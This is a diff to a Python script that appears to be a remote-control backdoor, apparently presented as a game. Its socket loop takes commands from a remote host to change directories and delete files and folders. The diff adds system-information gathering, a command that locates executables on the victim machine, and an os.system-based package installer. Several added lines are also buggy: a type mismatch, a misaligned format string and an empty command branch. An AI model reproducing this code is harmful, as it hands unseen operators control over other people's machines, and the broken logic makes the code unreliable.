@@ -1,6 +1,39 @@
 import socket as st
 import os,shutil
+import importlib.util
+import platform
 # from colorama import Fore, Style
+
+def get_system_information():
+    if platform.system() == 'Windows':
+        getBuildNumber = platform.version().split('.')[2]
+        if getBuildNumber < 22000:
+            os_name = 'Windows 10'
+        elif getBuildNumber >= 22000:
+            os_name = 'Windows 11'
+        else:
+            os_name = None
+    return """
+    {}\n
+    Device name : {}
+    System : {}
+    OS version : {}
+    Architecture : {}
+    Machine : {}
+    Processor : {}
+    Core : {}\n\n
+    {}
+    """.format(
+        'SYSTEM INFORMATION'.center(150),
+        os_name,
+        platform.node(),
+        platform.version(),
+        platform.architecture(),
+        platform.machine(),
+        platform.processor(),
+        os.cpu_count(),
+        
+    )
 
 def main():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
@@ -18,6 +51,14 @@ def main():
                 os.chdir(_dir)  
                 sock.send(b"Directory changed successfully\n")
 
+            elif get_cmd == 'sysinfo':
+                pass
+
+            elif get_cmd.startswith('which '):
+                get_exec = get_cmd.split()[1]
+                get_exec_loc = shutil.which(get_exec)
+                sock.send(get_exec_loc.encode())
+
             elif get_cmd.startswith('rm '):
                 file_name = get_cmd.split()[1]
                 if os.path.exists(file_name):
@@ -25,6 +66,8 @@ def main():
                     sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                 else:
                     sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())
+
+            # elif get_cmd
 
             elif get_cmd.startswith('rmdir '):
                 folder_name = get_cmd.split()[1]
@@ -71,10 +114,21 @@ def main():
             print(err)
             sock.send(str(err).encode())
             continue
+        
+        except ConnectionResetError:
+            sock.close()
 
     sock.close()
     # os.system('clear')
     # print('Game window closed...')
 
-if __name__ == "__main__":
-    main()
+def configureApp():
+    os.system('python3 -m venv env')
+    os.system('source env/bin/activate')
+    packs = ['tk','socket','sys','os']
+    for lst_pk in packs:
+        if importlib.util.find_spec(lst_pk) is not None:
+            print('{} is installed'.format(lst_pk))
+        else:
+            os.system('pip install {}'.format(lst_pk))
+
